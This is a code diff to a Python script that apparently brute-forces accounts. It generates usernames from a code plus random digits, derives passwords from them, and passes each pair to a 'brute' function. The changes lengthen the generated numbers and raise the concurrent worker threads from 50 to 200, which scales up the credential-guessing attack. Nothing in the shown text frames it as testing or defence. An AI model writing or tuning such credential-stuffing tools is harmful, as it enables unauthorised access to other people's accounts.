@@ -43,12 +43,12 @@ def random_numbers():
   number=int(input('''
   Enter the number of numbers to make for example: 10
   total: '''))
-  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(code)+''.join(['%s'%(randint(0,9)) for i in range(0,6)]) for e in range(number)]]
+  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(code)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(number)]]
   print('''
   Good luck today :)
   Wait, bro, don't close it....
   ''')
-  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as th:
+  with concurrent.futures.ThreadPoolExecutor(max_workers=200) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   print('\n  Its finished bro')
 
@@ -83,7 +83,7 @@ Enter the number of e-mails to make. Example: 10
   Have a good day today :)
   Wait, bro, don't close it...
   ''')
-  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as th:
+  with concurrent.futures.ThreadPoolExecutor(max_workers=200) as th:
     {th.submit(brute, user['user'], user['pw']): user for user in data}
   print('\n  Its finished bro')
 
